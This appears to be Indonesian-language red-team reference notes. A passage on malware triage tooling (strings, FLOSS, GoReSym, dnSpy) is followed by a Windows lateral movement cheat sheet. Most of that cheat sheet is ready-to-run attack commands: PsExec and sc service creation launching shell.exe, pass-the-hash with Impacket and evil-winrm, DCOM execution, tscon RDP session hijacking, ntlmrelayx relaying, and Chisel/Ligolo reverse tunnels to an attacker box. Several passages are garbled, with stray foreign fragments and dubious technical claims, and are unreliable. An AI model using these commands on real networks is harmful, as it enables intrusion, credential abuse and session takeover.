| `DT_DEBUG` missing + custom interpreter path | Packed/musl |
| GOT entry patched post-link (compare `.rela.dyn`) | Hooking runtime (Egg/Audit LD_PRELOAD style) |

**Kenapa gagal:** stripped static ELF pada musl (atau Zig) — hampir tidak ada strings dinamis, no symbol. Wajib fingerprinting byte di `.rodata` (musl constant) atau signature `__libc_start_main` alternative.

---

## 8.9 Ekstraksi String (Multi-Encoding)

**Apa yang dikirim:**
```bash
# ASCII + UTF-16LE (Windows DLL/apiNames)
strings -a -n 6 sample.exe
strings -a --encoding=b sample.exe   # UTF-16LE
# via rabin2
rabin2 -zz sample.exe                # strings dalam tiap section
# dengan FLOSS (emulated deobfuscation)
floss sample.exe
```

**Output terprioritas (full triage output):**
```text
UTF-16LE: " SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run"
W comand: "powershell.exe -nop -w hidden -enc <base64>"
ASCII: "1.2.3.4" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; Chrome/131)"
Floss: stack-string decrypted dari routine di sub_4012f0
```

**Kenapa berhasil:** UTF-16LE (`--encoding=b` / `-e l`) wajib untuk registry path & API — plain ASCII strings meleset di binary PE Windows. Waktu file dibuat via shellcode `CharUpperW` pointer, encoded strings muncul sebagai stack-constructed dalam disassembly (dari ISH — Immediate String Heap) dan hanya terlihat oleh **FLOSS / strings-emulator**, bukan strings.

**Gagal ketika:** stack strings dengan XOR kunci single byte — FLOSS emulasi gagal jika pakai loop untul multi-rotate. Pakai IDA/Ghidra + dekripsi manual via Python: `bytes([c ^ 0x37 for c in stack_bytes])`.

---

## 8.10 Symbol Recovery: Go & Rust

**Go binary:**

**Apa yang dikirim:**
```bash
goresym.exe -t -d -p sample.exe   # GoReSym (mandiant) 1.7+
# atau di Ghidra: > Golang symbol recovery (Refinery) extension
```

**Kenapa berhasil:** Go runtime butuh function table internal pcln (`runtime.pclntab`) untuk trace/panic,DAn symbol dan file name source path sering intact meski stripped. GoReSym menemukan pclntab magic `0xFFFFFFF0` (go1.18+) atau `0xFFFFFFFB` (go1.20+, perlu versi major.minor.patch exact), rebuild nama function (`main.main`, `net.Dial`), firstmoduledata address, buildID.

Output:
```text
Build ID: GO\n1.21.0\linux\namd64
Functions: 15200
main.main RIPPER: 0x4a2f10
main.injectShell
```

**Gagal jika:** binary build dengan `go build -ldflags="-s -w"` + malformed pclntab (malware-go umum corruptu specific field biar IDA GoReSym dan IDA golang loader gagal). Counter: patch manual `pclntab.pcln` pointer recovery berbasis scan pattern `runtime.moredetails`.

**Rust binary:**
- Tidak ada pclntab ekivalen. Recovery via: (1) panic string `panicked at 'src/main.rs:?:?'` berisi path+line; (2) vtable + `rust_begin_unwind` masih ada di symbol-ELF statis; (3) di IDA, apply **cargo sccache** style regex pattern matching — cari call pattern `core::result::unwrap_failed`.
- Stripped Rust binary di ELF musl: hampir zero nama. Identifikasi by unique strings peladen: `rustc` release channel atau crate panic messages `assertion failed: ...`.
- Tool `rust-stripped-annotate`/IDB script oleh ban be memory forensics — pattern880 v0.3; perlu commit peer projects (một Bebek) untuk update tanda newest rustc 1.83 release.

---

## 8.11 .NET Decompilation (dnSpyEx / ILSpy)

**Kapan:** DIE deteksi `.NET` / `MSIL`, atau `mscoree.dll` di import + CLI header (`IMAGE_DIRECTORY_ENTRY_COMHEADER` index 14).

**Apa yang dikirim:**
```bash
# dnSpyEx 6.5.4 (fork maintained dnSpy) — drag-drop .exe
# Build-in decompiler: View → Windows → IL decompiler (switch C# ↔ IL)
```

**Apa yang muncul:**
```csharp
// d98xxCrypto3.cs
protected static byte[] Decode(XElement x) {
    return Convert.FromBase64String(x.Value).Select((b, i) => (byte)(b ^ key[i % key.Length])).ToArray();
}
// key = "tVictoryPath24; strOver = "https://.../gate.php"
```

**Kenapa berhasil:** kebanyakan loader .NET (Dany, Quasar, Remcos loader, AsyncRAT 0.5.x) hanya obfuscate metadata level (ConfuserEx, .NET Reactor), bukan IL semantiknya — dnSpy decompile 95% kode readable tanpa pengerjaan apapun.

**ConfuserEx 1.0 sample:**
```text
"<PrivateImplementationDetails>" tidak muncul
string reference via resource decrypt — cari fungsi integer-id lookup, rename symbol dengan dnSpy → buka Method → Edit Method untuk modular check
```

Untuk sample ConfuserEx: gunakan **de4dot-cex** (fork) atau **ConfuserEx-Tools**:
```bash
de4dot.exe -p un sample.exe   # generic unpacker profile detection
```

**ILSpy** (9.x, cross-platform, headless):
```bash
ilspycmd -p -o out/ sample.exe
```
Gunakan bila dnSpyEdit gagal pada .NET 8/9 runtime (native AOT — tidak bisa decompile; jelaskan di entry: single-file self-contained .NET 8+ native AOT memindahkan ke native-the-section-8.3 realm).

**Gagal:** (1) harassed symbols + control-flow obfuscated berat (Agile.NET), di mana control flow jadi `switch(temp) goto` — perlu deobfuscator dedicated; (2) JIT hooking / runtime patch `Assembly.Load` byte stream — hanya load di runtime, scripting perlu dnSpy debugger attach saat load ekstensi.

---

## 8.12 Urutan Toolchain untuk Sample Unknown (runbook)

```text
┌─ 0. Isolasi: sha256sum, salin ke VM analysis (Windows 11 24H2 atau Win7x64 lab) — NO execute dulu.
│
├─ 1. File type cepat:
│   $ file sample.bin           # PE32/ELF/script/unknown
│   $ diec -a -e sample.bin     # packer/compiler/entropy overview
│
├─ 2. PE path:
│   ├─ PE-bear → header anoma, section, TLS callback offset, overlay offset
│   ├─ Periksa: .NET? (mscoree import / CLI header)
│   │    └─ YA → de4dot, lalu dnSpyEx decompile → str extraction .NET-style
│   ├─ Packed? (entropy high, section UPX*/non-std)
│   │    └─ YA → upx -d atau dump otomatis via x64dbg run-trace
│   │           ulang step 1 pada dump
│   └─ Simpan: strings -a + -e b + floss → IOCs (C2, mutex, persistence path)
│
├─ 3. ELF path:
│   ├─ readelf -h -S -d → dyn/static, pie, interpreter
│   ├─ rabin2 -zz → strings (ASCII/UTF8/UTF16)
│   └─ Go? → goresym; Rust? → panic-message anchor; static → Ghidra
│
├─ 4. Overlay & resource carve: binwalk,foremost -i sample.bin, 7z-style exe resource explorer
│
└─ 5. Konfigurasi extraction & IOC → report yara/pattern untuk tim
```

**Checkpoint YARA hasil triage:** jika strings dan IAT clean, dan hanya fungsi injeksi terlihat → jangan berhenti — sample yang dianggap "sederhana loader" umum trial stage terenkapsulasi di resource/overlay/gate-server; pastikan stage-2 extraction via config decode baru selesai, kembali step 4 jika ternyata nested.

---

## 8.13 Jebakan Operasional

1. **DIE signature negative ≠ bersih.** Custom crypter 2023+ (mis. injector loader native Indonesia-rea) tidak ada di database DIE. Selalu cross-check entropy section manual: entropy rendah "aman" bisa berupa kod yang di-decrypt partial runtime.

2. **TimeDateStamp PEs dan `TimeDateStamp` adalah spoofable.** Jangan pakai untuk timestamp commitment — verifikasi dengan PEs Rich Header (`@comp.id` setter MSVC) atau debug directory (`RSDS` path + timestamp) yang jarang di-patch.

3. **Packer UPX-modifikasi: `upx -d` gagal.** Packer inland cukup patch 1-2 byte di `UPX!` header untuk membuat official UPX refuse unpack — wajib caraруч way (x64dbg ESP trick pada packer tersebut) atau man-patch kembali ke expected — ini membuat batch-processing pipeline auto-unpack gagal diam-diam.

4. **TLS callback anti-debug auto-menghancurkan sample** ketika dump dilakukan via run approach: beberapa sample cek `BeingDebugged` flag lalu `TerminateProcess` → dump bagian penuh tidak pernah sampai ke staging. Gunakan anti-anti-debug plugin (ScyllaHide 1.5) sebelum proses run di lab VM snapshot.

5. **File-size besar (installer, installer LG, Dropper adapted)** membuat FLOSS sangat lambat (emulasi semua routine bisa ~ 1-2 jam untuk 50MB installer). Pra-sigital: batasi `-n minimal` dan carve dulu resource (`7z x`) sebelum floss pada binary paten.

6. **.NET modern (IC 2024+: native AOT .NET 8/9 atau self-contained single file)** — dnSpyEx/ILSpy **tidak bisa** decompile: single-file .NET host extractor perlu `dotnet-single-file-extractor` tool, sedangkan native AOT tidak ada IL sama sekali (sama seperti native binary — kembali ke jalur 8.2-8.7).

7. **Tainted symbol map GoReSym bisa spoof nama function** — malware-go modern memang sudah edit `pclntab` custom buildtag (misal buildid "malicious tagged") → nama fungsi `main.main` bisa dipalsukan jadi `runtime.internal.system`. Jangan pernah memberi label verdict hanya dari nama fungsi; selalu baca body function atau call graph yang jelas (What actual bytes / API executed).

8. **Suffix file: .exe bisa bukan PE** atau PE-ELF dual/malformed loader (malware linux-dropper berisi PE appended di offset). `file` akan bilang ELF tapi trojan di dalam — jangan gunakan ekstensi untuk routing toolchain forward — gunakan signature header byte.

9. **strings default 4-char minimal (dalam binutils)** menghasilkan banyak noise untuk registry path pendek (`Run`) dan PCRE driver versi — triage harus minimal `-n 6` dan grep specific registry/URL/powershell pattern, bukan dump manual semua (time-burn besar).

10. **pestudio-blacklist miss positive tahun-tahun outdated** — contoh: YARA rule produk legacy mem-blacklist `WinExec`+"temp file" generic tapi keliru men-flag Lenovo bloatware laptop stitching (Updater `WinExec` legit). Validate artefak > tool verdict otomatis — jangan auto-quarantine binary internal corporate dari verdict packer/whitelist detection tool default (terutama yang defaultnya excessive).

## ad-misc-lateral

# ad-misc-lateral — misc

# Reference: Windows Lateral Movement

## 1. PsExec (SMB + Service Control Manager)

**Mekanisme:** Buat service via RPC over SMB (`\pipe\svcctl`), upload binary ADMIN$ share, start service → binary exec perintah.

| Item | Detail |
|---|---|
| Port | 445/tcp (SMB), 135/tcp (RPC mapper) |
| Prasyarat | Creds admin lokal /domain (atau hash via SMB), `ADMIN$` writable, `SERVICE_CREATE` |
| Artefak disk | `PSEXESVC.exe` di `C:\Windows`, event 7045 (Service Install) di System log |

```powershell
# Sysinternals
PsExec.exe \\10.10.10.5 -u DOMAIN\svc_admin -p Passw0rd cmd.exe

# Impacket (remote, tanpa Sysinternals di target)
impacket-psexec DOMAIN/admin:'Passw0rd'@10.10.10.5
impacket-psexec -hashes :NTHASH administrator@10.10.10.5   # Pass-the-Hash

# Manual (stealthier, tanpa PSEXESVC.exe di ADMIN$):
sc \\10.10.10.5 create evilsvc binpath="C:\Windows\Temp\shell.exe" start= auto
sc \\10.10.10.5 start evilsvc
sc \\10.10.10.5 delete evilsvc
```

**Kenapa berhasil:** SCM RPC authenticated → tebenggalai ADMIN$ writable berarti sudah admin.
**Kenapa gagal / berisiko:** Event 4697/7045 super-noisy; `ADMIN$` sharing dinonaktifkan; Protected Users group (banned NTLM type login).

---

## 2. WMI (DCOM + `DCOMLaunch`)

**Mekanisme:** RPC ke `ROOT\cimv2`, eksekusi via `Win32_Process.Create` / `Win32_Service`.

| Port | 135/tcp + ephemeral 49152–65535 (DCOM) |

```powershell
# One-liner via pwsh/WMI
wmic /node:10.10.10.5 /user:DOMAIN\svc_admin /password:Passw0rd process call create "cmd /c whoami > C:\Windows\Temp\o.txt"

# PowerShell remote WMI
Invoke-CimMethod -ClassName Win32_Process -ComputerName 10.10.10.5 -Credential $cred `
  -MethodName Create -Arguments @{CommandLine="cmd /c C:\Windows\Temp\shell.exe"}

# Impacket
impacket-wmiexec DOMAIN/admin:'Passw0rd'@10.10.10.5
impacket-wmiexec -hashes :NTHASH administrator@10.10.10.5
```

**Keuntungan:** no binary drop, no service → quieter dari PsExec. Log: `4648`(logon), WMI-Activity Operational log.
**Gagal jika:** DCOM disabled (hardening), firewall blok ephemeral RPC range, workstation tanpa Remote WMI ACL.

---

## 3. WinRM (HTTP(S) SOAP, PSRemoting)

| Port | 5985/tcp (HTTP), 5986/tcp (HTTPS) |
|---|---|
| Prasyarat | `TrustedHosts`/Kerberos sesuai, user di `Remote Management Users` group, atau admin |

```powershell
# Target (jika punya RCE): aktifkan
Enable-PSRemoting -Force
winrm quickconfig

# Client
$password = ConvertTo-SecureString 'Passw0rd' -AsPlainText -Force
$cred = New-Object System.Management.Automation.PSCredential ('DOMAIN\svc_admin', $password)
Invoke-Command -ComputerName 10.10.10.5 -Credential $cred -ScriptBlock { whoami }

# Shell interaktif
Enter-PSSession -ComputerName 10.10.10.5 -Credential $cred

# Relay via SOCKS proxy (chisel)
$pow = New-PSSessionOption -ProxyAccessType IEConfig
Invoke-Command -ComputerName 10.10.10.5 -Credential $cred -SessionOption (New-PSSessionOption -ProxyAccessType None) # + proxychains
```

**Apa yang terkirim:** SOAP envelope + PS payload (EncodedCommand base64 jika perlu). Log: PowerShell 4103/4104 (ScriptBlock), Event 4624 type 3.
**Crimson / evil-winrm:**
```bash
evil-winrm -i 10.10.10.5 -u svc_admin -p 'Passw0rd'
evil-winrm -i 10.10.10.5 -u administrator -H aad3b435b51404eeaad3b435b51404ee:NTHASH
```

---

## 4. DCOM Lateral (tanpa WinRM/WMI-exe)

```powershell
# MMC20.Application (default di Windows 10/11, Server 2016/2019/2022)
$c = [activator]::CreateInstance([type]::GetTypeFromProgID("MMC20.Application","10.10.10.5"))
$c.Document.ActiveView.ExecuteShellCommand("cmd",$null,"/c C:\Windows\Temp\shell.exe","7")

# ShellWindows (butuh Explorer jalan, cocok untuk Windows 7: browser-core)
$shell = [activator]::CreateInstance([type]::GetTypeFromCLSID("9BA05972-F6A8-11CF-A442-00A0C90A8F39","10.10.10.5"))
$shell.Item().Document.Application.ShellExecute("cmd.exe","/c calc","C:\Windows\System32","open",0)

# ExcelDDE / Visio — cek ketersediaan produk
```

**Kenapa sukses:** ProgID DCOM kompatibilitas legacy, jalan di jaringan "tanpa WinRM". Log hampir nihil (tidak ada logon type 3, hasilnya "network logon via RPCSS" — misinya am-nya akses remote activation via DCOM).
**Blokir:** DCOM hardening (KB5004441-style registry: `RestrictRemoteActivation`) di Windows Server 2016+/Windows 10+.

---

## 5. RDP Hijacking (Session Shadow / tscon)

**Konteks:** punya SYSTEM/creds target, sesi RDP user masih DISCONNECTED (bukan logged off).

```
Target 10.10.10.5, sesi admin user id=4 (cek: quser / query session)
```

```cmd
:: Sebagai SYSTEM via PsExec/sch
query session
tscon 4 /dest:console               ; hijack ke console session (phishing alert)

:: Dengan creds user lain:
tscon 4 /SERVER:10.10.10.5 /password:Passw0rd /user:DOMAIN\upduser
```

**Kenapa berhasil:** `tscon` dengan SE_TCB/SE_TakeOwnership privilege membuat token baru tanpa logon baru — Windows memperlakukan seperti reconnect normal, tidak muncul Event 4624 type 10 (muncul type 2/3 di lokal SYSTEM).
**Gagal jika:** Sesu id salah → data hilang; sesi logged-off (4445/4778 tidak muncul); RDP NLA + disconnected→killed by `TimeLimit`/`EndSession` GPO.

---

## 6. SMB Relay (ntlmrelayx)

**Mekanisme:** Intercept NTLM challenge-response (Auth → amplify credentials → SMB target) — passing challenge, bukan hash, target harus SMB signing disabled.

| Syarat SMB relay | Caranya cek |
|---|---|
| Signing disabled | `crackmapexec smb 10.10.10.0/24 --gen-relay-list` / nmap `smb-security-mode` |
| Target ≠ host asal | SMB hardening: no loopback relay |
| Creds serde-able | harus admin di target |

```bash
# Cek signing
nmap -p445 --script smb-security-mode 10.10.10.5
crackmapexec smb 10.10.10.0/24 --gen-relay-list relay.txt

# Relay ke SMB
impacket-ntlmrelayx -tf relay.txt -smb2support           # dump SAM
impacket-ntlmrelayx -tf relay.txt -smb2support -c 'powershell -enc <b64>'

# Relay ke LDAP (DC, untuk credential/ACL add)
impacket-ntlmrelayx -t ldap://10.10.10.10 --delegate-access    # RBCD on ADCS/RBCD
impacket-ntlmrelayx -t ldap://10.10.10.10 --escalate-user svc_web

# Trigger auth (harus punya input ke target):
Responder -I eth0 -v                    # LLMNR/NBT-NS poison (jangan -A kalau mau SMB relay)
# Coercion: via shell di host lain (PetitPotam ~MSRPC-MS-EFSR, DFSCoerce, PrinterBug)
```

**Kenapa berhasil:** SMB signing default "enabled but not required" pada Windows 10/11 → bisa relay; LDAP default no signing.
**Gagal jika:** SMB Signing required (Windows Server DC default required!) → harus ke port 445/636 LDAP; target punya Protected Users mitm; **SMB signing default required di Windows 11 24H2/Server 2025** — relay ke host modern akan gagal; ada Patch MS16-075-type AMP protection; `--no-mdm` di Responder (disable HTTP server agar jangan stop relay SMB).

---

## 7. Pivoting — Chisel

**Reverse TCP tunnel dengan SOCKS5.**

```bash
# Attack box (server)
chisel server -p 8000 --reverse

# Target (reverse client, unduh binary ke target)
./chisel.exe client 10.20.20.10:8000 R:socks
# atau single-port forward (mis. untuk port 3389 RDP)
./chisel.exe client 10.20.20.10:8000 R:3389:10.10.10.5:3389
```

| Metadata | Value |
|---|---|
| Kompabilitas | Windows 7+ single exe, no deps |
| Socks port default | 1080 (socks5) |
| Kabur dari proxy | `--header "Host: cdn.example"` via corporate HTTP proxy |

Setelah tunnel:
```bash
# /etc/proxychains.conf: socks5 127.0.0.1 1080
proxychains crackmapexec smb 10.10.10.0/24 -u user -p pass
proxychains impacket-wmiexec DOMAIN/admin:'Pass'@10.10.10.5
```

**Apa yang muncul:** TLS/plain TCP terlihat di egress; Jika `--reverse` dgn auth `user:pass` harus modifikasi: `chisel server -p 8000 --reverse --auth user:pass`.

---

## 8. Pivoting — Ligolo-ng

**TUN-based reverse tunnel = total arti: klien via virtual interface, bukan SOCKS (kecuali proxy mode).**

```bash
# Attack box (agent -i interface)
sudo ip tuntap add user darma mode tun ligolo
sudo ip link set ligolo up
sudo ligolo_proxy -selfcert                  # generate cert
sudo ligolo_proxy -certfile cert.pem -keyfile key.pem -listen 0.0.0.0:11601

# Target (agent)
ligolo_agent.exe -connect 10.20.20.10:11601 -ignore-cert
# Di ligolo console:
ifconfig   → pilih interface tun ligolo
ip addr add 10.10.10.5/32 dev ligolo        # routing manual per target/subnet
```

| Banding | Chisel | Ligolo-ng |
|---|---|---|
| Mode | SOCKS5 (per-tool proxychains) | TUN interface (semua tools jalan langsung) |
| Performa | OK | Lebih cepat (Go QUIC-encapsulated TCP, UDP-supported) |
| Tools yang perlu konfigurasi | Semua (nmap, cme, rdp) | Nol |

**Apa dikirim:** QUIC/TLS (UDP 11601 atau TCP) egress dari target — di egress-allowlist UDP bisa blocked.
**Kenapa gagal:** corporate proxy tanpa CONNECT/UDP; DPI terhadap QUIC; admin tidak bisa menambah TUN (butuh sudo/admin).

---

## Jebakan Operasional (Fail-Modes di Lapangan)

1. **SMB Relay habis pakai** — Windows 11 24H2 / Server 2025: SMB signing *required* default. Relay ke target modern gagal sinyal; uji dengan `cme --gen-relay-list` *sebelum* operasi, jangan asumsi.
2. **Ephemeral port firewall untuk WMI/DCOM** — 135 oke tapi 49152+ terblok. PsExec over 445 tidak kena ini — pilih teknik sesuai filtrasi bukan preferensi.
3. **`ADMIN$` share disabled** oleh hardening (uninstall admin share) → PsExec/`psexec` gagal, tapi WMI/WinRM tetap oke.
4. **Laps/Local admin jarak jauh ganda** — Windows 11 23H2+/Server 2025 built-in: gunakan credential LAPS-managed account, bukan PBKDF user lama. NTLM ke ADCS/DC dari LAPS account bukan-acl bisa masih oke tapi jangan lupa `WDigest`.
5. **Protected Users group** — NTLM tidak bisa PTH-able, hanya Kerberos; PsExec/wmiexec dengan hash gagal diam-diam.
6. **Duplicate/extend proxychains bug** — nmap di SOCKS5 dengan `-sT` saja; `proxychains nmap -sS` **tidak pernah jalan** → banyak red teamer stuck.
7. **Chisel reverse tanpa `--reverse` flag di server** → `R:socks` gagal, error "reverse not enabled".
8. **Ligolo tanpa `ip addr add`** → routing tak oke, semua tools timeout silent. Literally #1 pain.
9. **tscon mis-id sesi** → `quser` ulang dan verifikasi STATE `Disc` bukan `Down`; salah hijack sesi Aktif → kunci layar target & alarm SOC.
10. **WinRM TrustedHosts** — unik: `Invoke-Command` NTLM ke hostname bukan FQDN gagal; workgroup default hanya `TrustedHosts` setelah `winrm quickconfig`. Perbaiki: `Set-Item WSMan:\localhost\Client\TrustedHosts -Value "*" -Force`.
11. **RDP NLA + sesi terputus di 30 menit (GPO)** → RDP hijack tembus jendela sempit; cek `quser` *sebelum* kerja.
12. **Penting — non-aktifkan Responder servers di SMB relay** (Responder default aktif SMB) — mismatch auth challenge makan relay maut. Gunakan `responder -I eth0 --disable-SMB` atau `-A` jangan.

---
